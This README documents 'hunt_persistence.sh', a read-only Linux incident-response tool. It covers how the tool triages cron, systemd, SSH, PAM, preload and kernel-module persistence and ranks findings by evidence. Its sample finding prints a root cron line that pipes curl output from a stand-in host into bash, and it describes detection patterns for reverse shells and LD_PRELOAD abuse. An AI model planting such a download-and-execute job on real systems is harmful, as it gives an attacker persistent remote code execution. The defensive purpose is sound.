# `hunt_persistence.sh` — Linux persistence triage

Read-only **persistence** triage for **live Linux investigations** — built to run on a host you can't disturb. In one pass: **what the box is**, a **newest-first timeline of every persistence file**, **what persistence is currently armed (and which of it is running right now)**, and **the short list of items that carry actual evidence of being malicious**.

> **Companion:** [`hunt_intrusion.sh`](../hunt_intrusion/README.md) hunts the *active-intrusion* layer (reverse shells, webshells, self-hiding, log evasion). Run them together — persistence finds the foothold, intrusion finds the live hands-on-keyboard. Both share one engine and one doctrine (*flag on evidence, enumerate everything else*).

> Part of the [Linux DFIR Field Reference](../../README.md) → cross-ref [`09 - Persistence Mechanisms/`](<../../09 - Persistence Mechanisms/>).

## Why this is not the macOS approach

macOS DFIR leans on **code signing**: an unsigned thing in a launch directory is rare and meaningful. That model does **not** port to Linux, and pretending it does produces a wall of false positives. On Linux:

- The base OS ships **thousands of legitimate "persistence-shaped" things** — udev `RUN+=` rules, apt hooks, `.socket`/`.path` units, systemd generators, the standard `/etc/crontab` `PATH=` line, `binfmt_misc` handlers. **The mechanism is not the signal.** Flagging a mechanism because it exists = noise.
- Nothing is code-signed. The Linux equivalent of a signature baseline is the **package database** (`dpkg`/`rpm`): *does this file belong to a package, and is it unmodified?* That is genuinely powerful — but only when queried correctly (it is `usrmerge`-aware here) and it is used as a **baseline and a modifier**, never as a standalone "unowned = alert" spammer.

So this tool **flags on evidence, and enumerates everything else.** An item becomes an **anomaly** only when it carries evidence, in priority order:

1. **Behavioral payload** — the command downloads-and-runs, decodes-and-runs, opens a reverse shell, or executes from `/tmp`·`/dev/shm`·`/var/tmp`·a hidden system path.
2. **Integrity break** — a packaged file that no longer matches its package (`debsums`/`rpm -V`), or a hidden kernel module.
3. **Hard absolutes** — populated `/etc/ld.so.preload`, `pam_permit sufficient` in an auth stack, a non-root UID-0 account, an empty shadow password, `core_pattern` piping **outside the distro default**, a `modprobe install=` shell, `LD_PRELOAD` in a live process.
4. **Incident-window recency** — with `--since`/`--days`, a persistence file changed inside the window (the highest-value filter in live IR).

Everything else is **listed as inventory for you to eyeball, not scored.** Package-ownership *gates content-scanning* (a packaged, unmodified file is trusted — its body isn't payload-scanned) and "unowned" is a **+2 modifier** plus one short context list — never a stack of HIGHs.

## Safety contract

- **Read-only / non-destructive** — only read commands (`cat`, `grep`, `find`, `stat`, `readlink` on `/proc/*/exe`, `systemctl`/`dpkg`/`rpm` *queries*, `lsattr`, `getcap`, `sshd -T`). `crontab`/`atq`/`systemctl enable` are **never** invoked — spools and unit files are read directly. Nothing is written, enabled, loaded, or killed.
- **Console-only** — no report file, no temp files, no host footprint.
- **`root`-optional** — run with `sudo` for full coverage; degrades gracefully (per-user cron spools, `/etc/shadow`, other users' files, and most `/proc/*/exe`·`environ`·`maps` show as `??`/skip with a banner otherwise).

This folder contains **[`hunt_persistence.sh`](hunt_persistence.sh)** and this guide.

---

## RTR deployment (Real Time Response)

**For Falcon Insight or endpoint response platforms with size constraints**, use `hunt_persistence_loader.sh`:

```bash
# The loader is 25KB (fits RTR's 40KB limit)
sudo bash hunt_persistence_loader.sh --since 2026-07-01
sudo bash hunt_persistence_loader.sh --deep
```

The loader script embeds a gzip+base64-compressed copy of `hunt_persistence.sh` (58KB → 25KB), making it deployable to endpoint response platforms with strict size limits. **All arguments and modes work identically** — pass the same arguments as you would to `hunt_persistence.sh` directly.

---

## The blocks

Every run prints, in order:

### 1. HOST TRIAGE
`Hostname · Distro · Kernel · Virtualization · Boot time · Init system · Package manager · LSM (AppArmor/SELinux enforcing) · auditd (running + rules loaded) · integrity tooling present (debsums/rpm/AIDE) · kernel taint (decoded) · ld.so.preload state · enabled-unit/timer counts · incident-window mode.` The lay of the land, first — so a saved run is self-documenting.

### 2. RECENCY DIGEST (inventory — not scored)
A newest-modified-first timeline of persistence files across **every** surface in one list — `MODIFIED (UTC) · SURFACE · OWNER · PATH → target`. Without a window it shows the **20 most-recently-touched**; with `--since`/`--days` it shows **every file in the window**. This is the fastest "what changed" read: an implant's freshly-dropped unit or crontab floats to the top regardless of which surface it used.

### 3. CURRENT PERSISTENCE (inventory — not scored)
A concise listing of what is actually armed, for you to eyeball: enabled unit-files (newest-first, with resolved `ExecStart`), hand-placed `/etc`+`/run` units, every crontab job line, `at` jobs, shell-init files present, `authorized_keys` (with fingerprints) + sshd directives, PAM stacks, interactive accounts, sudo grants, autostart/binfmt/core_pattern — **and which resolved persistence targets are running right now** (armed & live), from a `/proc` walk. This is the "show me current persistence" view.

### 4. ANOMALIES (evidence-backed queue)
The short, ranked worklist — `[HIGH]` then `[NOTABLE]` — with a one-line `why` for each. **~empty on a clean host.** Followed by a short **"unowned files in system persistence dirs"** context list (verify against admin / non-repo installs) and a `HIGH · NOTABLE` tally.

---

## Quick start

```bash
# Full triage: host + current persistence + anomalies
sudo bash hunt_persistence.sh

# Live incident — promote anything changed since the intrusion window
sudo bash hunt_persistence.sh --since 2026-07-01

# Just the hunt queue (skip the inventory listing), highs only
sudo bash hunt_persistence.sh --anomalies-only --min-severity high

# Add the slow, high-value integrity baseline (debsums / rpm -Va) + full-fs SUID/caps
sudo bash hunt_persistence.sh --deep

# One surface after a lead
sudo bash hunt_persistence.sh --modules ssh,cron
```

### Options

| Option | Effect |
|---|---|
| `--since YYYY-MM-DD` | Incident window — **promote** items changed on/after this date to findings |
| `--days N` | Incident window — promote items changed in the last N days |
| `--deep` | Add slow checks: package integrity (`debsums`/`rpm -Va`) + full-filesystem SUID/caps scan |
| `--modules a,b,c` | Limit to surfaces: `cron systemd initscripts shell ssh pam accounts preload kmod procscan triggers integrity` |
| `--min-severity T` | Anomaly filter: `high` \| `notable` (default: both) |
| `--inventory-only` | Triage + inventory, skip the anomaly scan |
| `--anomalies-only` | Triage + anomalies, skip the inventory listing |
| `-h`, `--help` | Usage |

**On recency:** without `--since`/`--days`, recency is **context only** (shown, never a finding) — otherwise a freshly-updated box would light up. With a window set, recency becomes a promoting signal. Timestamps are UTC.

---

## What each surface checks

All checks are read-only. Each surface **lists** its current state (block 2) and **evaluates** for evidence (block 3).

### `cron` · `T1053.003 / T1053.002`
Lists every job line from per-user spools (`/var/spool/cron/*`, `/etc/crontabs` — `??` if unreadable without root), `/etc/crontab`, `/etc/cron.d/*`, and the `at` queue. **Flags** a job whose command is payload-shaped (download/decode/reverse-shell/temp-path), a `PATH=` that **prepends** a writable/cwd dir (the standard `PATH=` never matches), an unowned dropped script in a `cron.{daily,…}` dir (packaged ones are trusted, not body-scanned), or — in a window — a recently-changed job. **Command provenance:** the job's schedule (and user field) is stripped down to the actual binary and, if it runs `sh -c '…'`, the payload is scanned; a job that launches an **unowned** binary is a modifier even when the crontab file itself is packaged.

### `systemd` · `T1543.002 / T1053.006`
Lists **all enabled unit-files** (the boot surface to eyeball, newest-first) and every `/etc`+`/run` unit with its `ExecStart`. **Flags** a unit/drop-in whose `Exec*` is payload-shaped, `Environment=LD_PRELOAD`, an unowned unit in `/etc`, an unowned generator in `/etc/systemd/system-generators`, or a **masked security/logging unit** (auditd/falco/rsyslog/ufw/… disabled = defense evasion). **ExecStart provenance:** the `ExecStart` is resolved through systemd's exec prefixes (`@ - + ! :`), `env` assignments, and `sh -c` to the real binary — so a *packaged, trusted* `.service` whose `ExecStart=/tmp/.x` (or an **unowned** target binary) is caught on the target, not just the unit file's owner. Vendor units in `/usr/lib` are not body-scanned (a *modified* one is caught by `--deep` integrity; every enabled one is already listed).

### `initscripts` · `T1037`
`/etc/rc.local`, unowned `/etc/init.d/*` (SysV), OpenRC `/etc/local.d/*.start`, runit `/etc/sv/*/run`. Flags on payload shape / unowned+window.

### `shell` · `T1546.004`
System-wide (`/etc/profile`, `/etc/bash.bashrc`, `/etc/profile.d/*`, `/etc/environment`) and per-user init for every shell family, plus `~/.ssh/rc`. **Flags** only genuinely malicious content — download|exec, reverse shell, `LD_PRELOAD`/`LD_AUDIT`, `BASH_ENV`/`ENV` pointing at a file, an `alias`/function over `sudo`/`ssh`/`ls`. Packaged system files are trusted unless modified.

### `ssh` · `T1098.004`
Lists every `authorized_keys` (count + `ssh-keygen` fingerprints), sshd effective `PermitRootLogin`/directives. **Flags** a forced-command key running a payload, a key on a **service account**, `sshd` `ForceCommand`/`AuthorizedKeysCommand`/redirected `AuthorizedKeysFile`, or a key changed in-window.

### `pam` · `T1556.003`
**Flags** the classics directly: `auth sufficient pam_permit`/`pam_succeed_if` (skeleton key), `pam_exec`/`pam_python` running a script, a **non-standard module name** referenced, or a `pam_*.so` on disk owned by no package (`usrmerge`-aware, so `pam_unix.so` etc. are correctly recognized as packaged).

### `accounts` · `T1136 / T1548.003`
Lists interactive accounts and **all sudo grants** (NOPASSWD-for-a-human is inventory — every cloud/workstation box has it). **Flags** a non-root UID-0 account, an empty shadow password, a service account with an interactive shell, or a **service account granted sudo**.

### `preload` · `T1574.006`
`/etc/ld.so.preload` populated (HIGH), `LD_PRELOAD`/`LD_AUDIT` in `/etc/environment`·profile·`pam_env`·`ld.so.conf`, and a read-only `/proc/*/environ` sweep for `LD_PRELOAD` in any **live process**.

### `kmod` · `T1547.006`
A **hidden module** (in `/proc/modules` but not `lsmod` — self-hiding LKM), a `modprobe.d` `install`/`alias` that runs a shell (legit `install … /bin/true` disables are not flagged), and — with `--deep` — an unowned `.ko` in the running kernel tree.

### `procscan` · `T1055 / T1620`
Walks `/proc` and reasons about **what is actually executing**, which is where fileless and confirmed-active implants show. Three checks: (1) **backing executable** (`/proc/PID/exe`) — running from `memfd:` / `/tmp` / `/dev/shm` / a hidden path → **HIGH** (never benign); a *deleted* system binary whose on-disk path still exists is treated as a **pending-restart-after-upgrade note** (not a finding — the biggest deleted-exe false positive on Linux), while a deleted binary whose path is gone, or one deleted from `/home`, is **NOTABLE**. (2) **Correlation** — any cron/systemd target resolved above that is **running right now** is listed under *armed & live*; if that persistence item was itself flagged suspicious, being live **elevates it to `CONFIRMED-ACTIVE` HIGH**. (3) **Mapped libraries** (`/proc/PID/maps`) — a `.so` that is deleted / on `tmpfs` / in a hidden path, or an **executable** `memfd:` mapping → **HIGH** (injected/`LD_PRELOAD`-style library), deduped across all processes (a *non-executable* `memfd` data segment — PulseAudio/`xshmfence`/Mesa on desktops — is legitimate and skipped). The two *unowned-but-otherwise-normal* signals — a running binary or a mapped `.so` that no package owns — are **incident-window only** (`--since`/`--days`): on app servers unpackaged binaries/libraries (`node`/`python`/`/opt` builds) are common and benign, so the broader (and slower, per-process package-query) net is opt-in rather than a routine-sweep flood. Needs root for full coverage; degrades gracefully otherwise.

### `triggers` · `T1546`
udev `RUN+=`, XDG autostart, `update-motd.d`, NetworkManager dispatcher, `core_pattern`, `kernel.modprobe`, `binfmt_misc`, inetd/xinetd, apt hooks, git `hooksPath`, mail `.forward`. **All listed/counted; flagged only on payload shape, an unowned+editable dropped script, or `core_pattern`/`kernel.modprobe` pointing outside the distro default** (apport/systemd-coredump are recognized as legit).

### `integrity` *(--deep)* · `T1554 / T1548.001`
`debsums -c` / `rpm -Va` → **integrity-fail** on any modified packaged system file (trojaned `sshd`/`login`/`pam_unix.so`/coreutils). Dangerous file **capabilities** and recent **SUID-root** binaries, with container/overlay dirs pruned and packaged binaries trusted.

> `debsums` isn't installed by default on Debian/Ubuntu — `sudo apt install debsums` to enable the integrity baseline there. RPM hosts use the built-in `rpm -Va`.

---

### Reading a finding

```
[HIGH] cron: web-backup                          ← source: label
   where: /etc/cron.d/web-backup                  ← the persistence file
   what : * * * * * root curl -s http://x/c|bash  ← the item / command
   why  : DOWNLOAD-EXEC UNOWNED                    ← the evidence that fired (drives the tier)
```

The run ends with `N HIGH · M NOTABLE`. A finding always names the **evidence** — never "this mechanism exists."

### Notes & limitations

- **`usrmerge`-aware provenance.** On modern Debian/Ubuntu `/lib`→`/usr/lib`, but the dpkg DB records the old `/lib/...` paths, so a naïve `dpkg -S /usr/lib/...` wrongly reports "not owned." `pkg_owns()` queries both forms — this is the single biggest false-positive fix vs. a naïve port.
- **One flag is a lead, not a verdict.** Payload shape + unowned + in-window recency is what an implant looks like; any one alone is context.
- **No baseline required, but a baseline is better.** Package integrity (`--deep`) is the on-box baseline; for true diffing keep a golden-image list of enabled units, crontabs, `ld.so.preload`, and PAM stacks per fleet build.
- **Stealth-tier confirmation is out of scope by design** — cheap read-only kernel/live signals only (taint, module-view diff, `ld.so.preload`, `/proc/environ`); a hooked-syscall rootkit is confirmed in RAM (see `11 - Memory Forensics` / `11c - Rootkit Detection Tooling`), not here.
- **Container internals are pruned** (`/var/lib/docker`, `/var/lib/containers`, `/snap`, …) so full-fs scans report host findings, not container layers.
- **First-class vs best-effort:** systemd + dpkg/rpm are the tested path; OpenRC/runit/sysv and pacman/apk degrade gracefully.

---

## Strengths & weaknesses

An honest picture of where this tool is strong and where it is *deliberately* not the answer — so you know what to pair it with.

### Strengths

- **Near-zero false positives on a clean host.** Validated **0 HIGH · 0 NOTABLE** on a stock SANS SIFT (Ubuntu 20.04) where the naïve v1.0 fired 176. The entire engine is *flag on evidence, enumerate everything else* — the mechanism existing is never the signal.
- **No baseline, no agent, no install.** A single read-only pass in one SSH / EDR live-response shell. Nothing is written, enabled, loaded, or killed; output is console-only, leaving no host footprint.
- **Package provenance is the trust anchor** — the Linux answer to macOS code-signing — and it is `usrmerge`-aware, the single biggest false-positive fix over a naïve `dpkg -S`. Ownership *gates* content-scanning (packaged + unmodified files are trusted) rather than spamming "unowned = alert."
- **It reasons about the *executed binary*, not just the file's owner.** `exec_target()` resolves systemd exec prefixes (`@ - + ! :`), `env`/`VAR=` assignments, and `sh -c '…'`, so a *packaged, trusted* `.service` or crontab whose target is `/tmp/.x` or an unowned binary is still caught — the gap a file-owner-only check misses.
- **Fileless & confirmed-active coverage.** The `/proc` walk catches `memfd`/deleted/tmpfs execution and correlates armed persistence against live processes: *armed **and** running* becomes `CONFIRMED-ACTIVE`, which is the difference between "a suspicious unit exists" and "the implant is executing right now."
- **Incident-window mode is the force multiplier.** `--since`/`--days` turns recency into a promoting signal and opens the broader opt-in nets — the highest-value filter once you've scoped an intrusion.
- **A short, ranked worklist.** `HIGH → NOTABLE` with a one-line `why`, on top of a full inventory to eyeball. Built for triage speed, not a data dump.
- **Portable and graceful.** systemd + dpkg/rpm are first-class; OpenRC/runit/sysv and pacman/apk degrade instead of crashing; non-root runs with a clear coverage banner.

### Weaknesses (and what to pair it with)

- **Not a rootkit confirmer.** A kernel-mode LKM/eBPF rootkit that hooks syscalls can hide processes, modules, files, and `/proc` entries from *every* check here. The `kmod` / taint / `ld.so.preload` checks are cheap tells, not proof — a hooked kernel is confirmed in **memory**, not on a live box that is lying to you. → `11 - Memory Forensics`, `11c - Rootkit Detection Tooling`.
- **Point-in-time snapshot, not monitoring.** A purely in-memory implant with no on-disk persistence that isn't currently running is invisible. It answers *what persists* and *what is live now* — it does not replay history. → auditd / journald / `13 - Timelining`.
- **Trusts the package database.** Provenance and `--deep` integrity are only as honest as the `dpkg`/`rpm` DB and `debsums` hashes. An attacker who rewrites the DB (or a packaged file *and* its recorded hash) defeats the ownership signal — cross-check against an **off-box golden hash set** for high-assurance cases.
- **Pattern-based content scanning.** `scan_cmd` uses tight regex for download-exec / decode-exec / reverse-shell / temp-exec. Heavy obfuscation, encryption, multi-stage payloads, or genuinely novel living-off-the-land can slip a single-line regex. It is a high-**precision** net, not a complete-**recall** one.
- **No cross-host baselining / allowlist.** Every host is judged on its own package DB; it can't yet auto-demote a known-good third-party agent fleet-wide. (Fleet allowlist is on the roadmap.)
- **Out of scope by design:** network / C2 / beaconing analysis, log & timeline analysis, memory, and browser artifacts. This is the *persistence + running-process* layer of a larger investigation, not the whole thing.
- **`--deep` is slow.** `debsums -c` / `rpm -Va` and full-filesystem SUID/caps walks run in minutes — a focused second pass, not the first look.
- **Full coverage needs root.** Non-root loses per-user cron spools, `/etc/shadow`, other users' files, and most `/proc/*/exe|maps|environ`; it degrades with a banner, but coverage is partial.

---
